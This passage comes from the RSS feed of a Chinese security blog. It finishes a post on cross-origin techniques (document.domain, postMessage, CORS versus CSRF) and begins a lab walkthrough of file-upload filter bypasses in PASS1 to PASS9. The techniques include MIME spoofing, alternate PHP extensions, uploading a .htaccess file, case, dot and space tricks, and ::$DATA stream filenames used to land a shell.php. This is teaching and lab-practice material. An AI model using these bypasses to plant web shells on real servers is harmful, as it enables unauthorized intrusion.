&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;domain&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;test.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;//当iframe加载这个页面时，也设置document.domain，使之与主页面的document.domain相同
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;windowpostmesage方法&#34;&gt;window.postMesage方法&lt;/h3&gt;
&lt;p&gt;HTML5新增了postMessage方法：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;postMessage&lt;/code&gt;：otherWindow.postMessage(message, targetOrigin);&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;otherWindow：指目标窗口，即向哪个window发送消息，可以是window.frames 属性的成员或者由 window.open 方法创建的窗口&lt;/li&gt;
&lt;li&gt;message：是要发送的消息，类型为 String、Object&lt;/li&gt;
&lt;li&gt;targetOrigin：是限定消息接收范围，不限制请使用 &lt;code&gt;*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;跨域原理：&lt;/p&gt;
&lt;p&gt;iframe标签加载目标域内容，加载时通过postMesage传送消息，在目标域中通过监听message时间来获取消息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;可跨主域、双向跨域&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;// test.com/test.html：加载窗口并发送消息

&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;  
    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;proxy&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://target.com/remote.html&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onload &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;postMsg()&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;display: none&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;  
    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;  
        &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;  
            &lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;hahaha!&amp;#39;&lt;/span&gt;  
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  
        &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;postMsg&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;  
            &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;proxy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  
            &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contentWindow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  
            &lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;postMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://target.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  
    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;// http://target.com/remote.html：监听事件，获取消息

&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onmessage&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;origin&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://localhost:8088&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; from &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;origin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;cors-与-csrf异同&#34;&gt;CORS 与 CSRF异同&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;相同点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;都需要借助第三方网站&lt;/li&gt;
&lt;li&gt;都需要借助 AJAX 的异步过程&lt;/li&gt;
&lt;li&gt;一般都需要用户登录&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;不同点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第三方网站可以利用 CORS 漏洞读取到受害者的敏感信息&lt;/li&gt;
&lt;li&gt;第三方网站可以利用 CSRF 漏洞可以让受害者执行一些敏感操作&lt;/li&gt;
&lt;li&gt;一般有 CORS 漏洞的地方也会有 CSRF 漏洞&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>文件上传</title>
        <link>https://coollllllll.github.io/p/file-upload/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/file-upload/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/file-upload/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 文件上传" /&gt;&lt;h1 id=&#34;文件上传相关&#34;&gt;文件上传相关&lt;/h1&gt;
&lt;h2 id=&#34;初始参考思路&#34;&gt;初始参考思路&lt;/h2&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 139; 
			flex-basis: 334px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/mind-map.png&#34; data-size=&#34;914x655&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/mind-map.png&#34;
			width=&#34;914&#34;
			height=&#34;655&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/mind-map_hu3901bfc98ce8145002a67e37648cb9c6_208845_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/mind-map_hu3901bfc98ce8145002a67e37648cb9c6_208845_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass1&#34;&gt;PASS1&lt;/h2&gt;
&lt;p&gt;直接上传快速弹框，且点击上传抓包无数据，属于前端校验&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 307; 
			flex-basis: 737px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426101542205.png&#34; data-size=&#34;452x147&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426101542205.png&#34;
			width=&#34;452&#34;
			height=&#34;147&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426101542205_hu4211c69b0a612d433d976917be1436c4_7447_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426101542205_hu4211c69b0a612d433d976917be1436c4_7447_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;方式一：修改原始后缀，先绕过前端，再修改后缀和Content-Type&lt;/p&gt;
&lt;p&gt;方式二：抓包修改响应包，前端禁用JS即可&lt;/p&gt;
&lt;h2 id=&#34;pass2&#34;&gt;PASS2&lt;/h2&gt;
&lt;p&gt;直接上传响应类型不正确，应该是后端校验&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 658; 
			flex-basis: 1580px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426111437115.png&#34; data-size=&#34;303x46&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426111437115.png&#34;
			width=&#34;303&#34;
			height=&#34;46&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426111437115_hu1f555d46d0dbfdc4fde3aa2d894d1c0a_2706_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426111437115_hu1f555d46d0dbfdc4fde3aa2d894d1c0a_2706_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改后缀为.jpg失败，修改Conten-Type成功(MIME检测)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 226; 
			flex-basis: 542px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426113242515.png&#34; data-size=&#34;520x230&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426113242515.png&#34;
			width=&#34;520&#34;
			height=&#34;230&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426113242515_hu64c108b22ff42fe26170cdf21c116d3c_21464_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426113242515_hu64c108b22ff42fe26170cdf21c116d3c_21464_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;常见MIME&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 50; 
			flex-basis: 120px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426113538079.png&#34; data-size=&#34;374x746&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426113538079.png&#34;
			width=&#34;374&#34;
			height=&#34;746&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426113538079_hu87253e559ba39c97f059c06b11cb79c4_33233_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426113538079_hu87253e559ba39c97f059c06b11cb79c4_33233_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass3&#34;&gt;PASS3&lt;/h2&gt;
&lt;p&gt;直接上传显示如下，表示存在基于后缀的黑名单&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 679; 
			flex-basis: 1630px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426133956586.png&#34; data-size=&#34;360x53&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426133956586.png&#34;
			width=&#34;360&#34;
			height=&#34;53&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426133956586_hu7b840170c7593d951887b04b815d62dd_3754_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426133956586_hu7b840170c7593d951887b04b815d62dd_3754_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改后缀为一些特殊后缀用于绕过，并且能够服务器解析php文件：php3、php5、php7、phtml、pht&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 210; 
			flex-basis: 504px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426145039383.png&#34; data-size=&#34;511x243&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426145039383.png&#34;
			width=&#34;511&#34;
			height=&#34;243&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426145039383_hucb5a79baab59388ffddad18c8264e1da_22056_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426145039383_hucb5a79baab59388ffddad18c8264e1da_22056_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意：题目docker环境中默认没有开启对phtml等后缀的解析，可编辑/etc/mime.types 去掉部分行的注释即可&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 475; 
			flex-basis: 1141px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426154848028.png&#34; data-size=&#34;452x95&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426154848028.png&#34;
			width=&#34;452&#34;
			height=&#34;95&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426154848028_hud936586e736099af0ae0132ce0adb6e5_6402_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426154848028_hud936586e736099af0ae0132ce0adb6e5_6402_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass4&#34;&gt;PASS4&lt;/h2&gt;
&lt;p&gt;直接上传提示如下&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 637; 
			flex-basis: 1529px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426151001993.png&#34; data-size=&#34;223x35&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426151001993.png&#34;
			width=&#34;223&#34;
			height=&#34;35&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426151001993_hu39004d21e0908aafce7736f38002b608_2023_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426151001993_hu39004d21e0908aafce7736f38002b608_2023_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上传非法后缀可以，表示存在黑名单，但是未过滤.htaccess&lt;/p&gt;
&lt;p&gt;上传.htaccess重写解析规则绕过&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 880; 
			flex-basis: 2112px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426161432665.png&#34; data-size=&#34;308x35&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426161432665.png&#34;
			width=&#34;308&#34;
			height=&#34;35&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426161432665_hue002665d7f95a8de2a7e510eb4747d32_1780_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426161432665_hue002665d7f95a8de2a7e510eb4747d32_1780_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;image-20210426161432665&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;image-20210426161432665&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;表明将jpg后缀当作php来解析，再上传一个php文件抓包修改后缀即可成功解析&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 215; 
			flex-basis: 517px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426161713163.png&#34; data-size=&#34;472x219&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426161713163.png&#34;
			width=&#34;472&#34;
			height=&#34;219&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426161713163_hu2a2f48f549e94825f2da32a6490ddffb_19194_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426161713163_hu2a2f48f549e94825f2da32a6490ddffb_19194_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意：题目docker环境中.htaccess并不会重写生效，需要做如下配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sudo a2enmod   随后输入rewrite表示让apache加载重写模块&lt;/li&gt;
&lt;li&gt;修改/etc/apache2/apache2.conf 文件下如下部分&lt;/li&gt;
&lt;li&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 95; 
			flex-basis: 229px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426163827731.png&#34; data-size=&#34;352x368&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426163827731.png&#34;
			width=&#34;352&#34;
			height=&#34;368&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426163827731_hu32e04a4c36c9efd017bcfae2f32465f0_38420_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426163827731_hu32e04a4c36c9efd017bcfae2f32465f0_38420_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;重启docker环境&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pass5&#34;&gt;PASS5&lt;/h2&gt;
&lt;p&gt;还是和PASS4一样黑名单(加入了.htaccess)，但是未转小写，可通过大写绕过&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 232; 
			flex-basis: 557px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210426165700765.png&#34; data-size=&#34;511x220&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210426165700765.png&#34;
			width=&#34;511&#34;
			height=&#34;220&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210426165700765_hu9b12fd039be8f4b4fb7ebb29d09c3dd3_20050_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210426165700765_hu9b12fd039be8f4b4fb7ebb29d09c3dd3_20050_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass6&#34;&gt;PASS6&lt;/h2&gt;
&lt;p&gt;黑名单，加入.htaccess，转小写,但是未去空格&lt;/p&gt;
&lt;p&gt;上传php文件，文件名后加空格绕过&lt;/p&gt;
&lt;h2 id=&#34;pass7&#34;&gt;PASS7&lt;/h2&gt;
&lt;p&gt;黑名单，转小写，去空格，未去&#39;.&#39;&lt;/p&gt;
&lt;p&gt;上传php文件，文件名后加.绕过&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 219; 
			flex-basis: 527px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/file-upload/image-20210427092924772.png&#34; data-size=&#34;521x237&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/file-upload/image-20210427092924772.png&#34;
			width=&#34;521&#34;
			height=&#34;237&#34;
			srcset=&#34;https://coollllllll.github.io/p/file-upload/image-20210427092924772_hua5d9e885c463e14c975af13ef8eb28d2_20913_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/file-upload/image-20210427092924772_hua5d9e885c463e14c975af13ef8eb28d2_20913_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注意：PASS6 和 PASS7都是利用了windows系统的文件名特性，在文件名后加[空格]、[.]会被自动去除，例如shell.php[空格] 或 shell.php[.]保存至windows后即为shell.php。但是在linux docker环境下空格绕过失败、加点绕过成功（多后缀解析漏洞）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多后缀解析漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AddHandler application/x-httpd-php .php&lt;/code&gt;   //只要含.php的都会被当作php文件被解析
或者
&lt;code&gt;&amp;lt;FilesMatch &amp;quot;.+\.ph(ar|p|tml)&amp;quot;&amp;gt; SetHandler application/x-httpd-php &amp;lt;/FilesMatch&amp;gt;&lt;/code&gt;
上面两个配置都可以实现解析文件名中包含.php后缀的文件，apache对文件后缀名的识别是从后向前进行匹配的，以单个.作为分隔符。当遇到不认识的后缀时继续往前，直到识别，若都不识别就不做处理。&lt;/p&gt;
&lt;h2 id=&#34;pass8&#34;&gt;PASS8&lt;/h2&gt;
&lt;p&gt;黑名单，未去除&#39;::$DATA&amp;rsquo;字符串&lt;/p&gt;
&lt;p&gt;在文件名后添加::$DATA绕过&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;windows文件流特性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NTFS交换数据流（alternate data streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。创建一个数据交换流文件的方法：“宿主文件:准备与宿主文件关联的数据流文件”&lt;/p&gt;
&lt;p&gt;比如:shell.php::$DATA 上传至windows实际上访问的就是shell.php本身流数据 。如果shell.php还有别的数据流，比如:shell.php:shell1.php ,那么请求shell.php:shell1.php::$DATA，实际上访问的是shell.php流数据中的shell1.php流数据&lt;/p&gt;
&lt;p&gt;也就是说在后端判断时可绕过后缀名检测，落地后即为shell.php，可以正常解析。&lt;/p&gt;
&lt;h2 id=&#34;pass9&#34;&gt;PASS9&lt;/h2&gt;
&lt;p&gt;黑名单，去除点，首尾去空&lt;/p&gt;
&lt;p&gt;类似PASS6，在文件名后添加. .(点 空格 点)绕过&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 232; 
			flex-basis: 558px&#34;
	&gt;
